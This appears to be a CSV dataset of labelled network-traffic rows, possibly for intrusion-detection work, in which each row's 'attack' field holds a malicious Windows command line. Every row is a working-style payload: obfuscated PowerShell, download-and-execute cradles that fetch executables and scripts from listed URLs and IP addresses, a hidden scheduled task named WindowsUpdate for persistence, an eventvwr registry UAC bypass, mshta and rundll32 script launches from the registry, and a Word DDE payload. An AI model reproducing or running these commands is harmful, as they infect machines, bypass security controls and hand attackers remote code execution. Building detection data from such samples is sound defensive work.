field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
TIMING,212.233.50.117,163.62.129.176,443,49964,6,"powershell.exe SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \""{2}{3}{1}{0}\""-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \""{4}{0}{7}{1}{5}{2}{3}{6}\""-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\""VaL`UE\"".\""iN`VO`k`eCom`MANd\"".( \""{3}{1}{2}{0}\"" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\""{0}{4}{1}{2}{5}{3}\"" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\""{1}{0}\""-f's','PrOCeS' ))) )
",3361,3361
TIMING,52.6.59.118,163.62.139.80,443,56048,6,"powershell.exe $zWC='IUA';$QHY='http://trabanatours.com/u@http://pizzeriarondo.si/z8cG@http://diahmarsidi.com/MPCTKG@http://ogrodyusmiechu.pl/iubv8v@http://assurance-charente.fr/sfh'.Split('@');$aBp=([System.IO.Path]::GetTempPath()+'\mQN.exe');$pdZ =New-Object -com 'msxml2.xmlhttp';$tpk = New-Object -com 'adodb.stream';foreach($uiA in $QHY){try{$pdZ.open('GET',$uiA,0);$pdZ.send();$tpk.open();$tpk.type = 1;$tpk.write($pdZ.responseBody);$tpk.savetofile($aBp);Start-Process $aBp;break}catch{}}
",3961,3961
TIMING,185.50.99.189,203.139.121.234,40828,30303,6,"schtasks.exe /Create /sc MINUTE /MO 1 /TN WindowsUpdate /TR ""Powershell -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\""http://118.193.251.137/dropbox/?p=BT67HU78HZ\\\"",\\\""$env:public\svchost325.vbs\\\"");(New-Object -com Shell.Application).ShellExecute(\\\""$env:public\svchost325.vbs\\\"");""
",2441,2441
TIMING,203.139.121.234,109.196.225.86,30303,52816,6,"powershell.exe -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\'http[:]//118.193.251[.]137/dropbox/?p=BT67HU78HZ\\\',\\\'$env:public\svchost325.vbs\\\');(New-Object -com Shell.Application).ShellExecute(\\\'$env:public\svchost325.vbs\\\');'
",2017,2017
TIMING,174.200.239.33,203.139.121.234,30303,51702,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\FTZLZTRLAPJCLE').ZRAKUTR)));
",1585,1585
TIMING,47.9.70.174,203.139.121.234,30303,57654,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL],'%TEMP%\\pu457.exe') & reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d %TEMP%\\pu457.exe /f & eventvwr.exe & PING -n 15 127.0.0.1>nul & %TEMP%\\pu457.exe
",2193,2193
TIMING,203.139.121.234,109.58.252.70,36694,30303,6,"mshta.exe javascript:d7hcQ4a=""vn"";n0a=new%20ActiveXObject(""WScript.Shell"");Rtf7j=""HIPc"";X18ycI=n0a.RegRead(""HKCU\\software\\tN32795\\74gjfzcsfI"");jM5IV6m=""QJ"";eval(X18ycI);XIaL0uze=""lYuLz1vG""
",1537,1537
TIMING,135.177.98.249,203.139.121.234,50322,30303,6,"winword.exe {ddeauto c:\\windows\\system32\\cmd.exe ""/k powershell IEX(New-Object Net.WebClient).Downloadstring('[URL]' )"" \* MERGEFORmAT}
",1113,1113
TIMING,18.26.229.200,203.139.121.234,30303,34958,6,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject('script:http://dx30z30a4t11l7be .lieslow[.]faith/5aad4b91a0da20d4faab0991bdbe7138')
",1345,1345
TIMING,139.196.243.33,203.139.121.234,44750,30303,6,"powershell.exe ""-Command IEX (New-Object('Net.WebClient')).'DoWnloadsTrInG'('http://spacemantra.biz/blyat.jpeg')""
",913,913
TIMING,203.139.121.234,13.5.165.135,59386,30303,6,"rundll32.exe javascript:”..mshtml,RunHTMLApplication “;eval((new%20ActiveXObject(“WScript.Shell”)).RegRead(“HKCUSoftwareMicrosoftActive%20SetupInstalled%20Components{72507C54-3577-4830-815B-310007F6135A}JavaScript”));close();
",1845,1845
TIMING,203.139.121.234,135.177.15.99,49024,30303,6,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write(""\74script language=jscript.encode>""+(new%20ActiveXObject(""WScript.Shell"")).RegRead(""HKCU\\software\\microsoft\\windows\\currentversion\\run\\"")+""\74/script>"")
",1857,1857
TIMING,89.168.39.139,203.139.118.176,873,56218,6,"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('http://rabbitons[.]pw/cache') | iex } else {(new-object Net.WebClient).DownloadString('http://rabbitons[.]pw/css') | iex}
",2185,2185
TIMING,203.139.121.234,174.200.239.33,51702,30303,6,"cmd.exe /K poweRshell.exe -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile('http://skycpa. in/file.php','%TEMP%\Y.ps1'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1
",2105,2105
TIMING,203.139.121.234,116.58.147.90,30303,44410,6,"powershell.exe ""[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::LocalMachine.OpenSubkey(‘SOFTWARE’).GetValue(‘$77stager’)).EntryPoint.Invoke($Null,$Null))""
",1337,1337
TIMING,95.198.27.64,203.139.121.234,44850,30303,6,"powershell.exe ""$hjf=New-Object System.Net.WebClient;$hjf.Proxy=[System.N^et.WebRequest]::GetSystemWebProxy();$hjf.Proxy.Credentials=[System.N^et.CredentialCache]::DefaultCredentials;$hjf.Headers.Add('User-Agent','M/5.18');$r=$hjf.DownloadString('http://193.109.69.5/gggm/upl/txt');IEX $r""",2313,2313
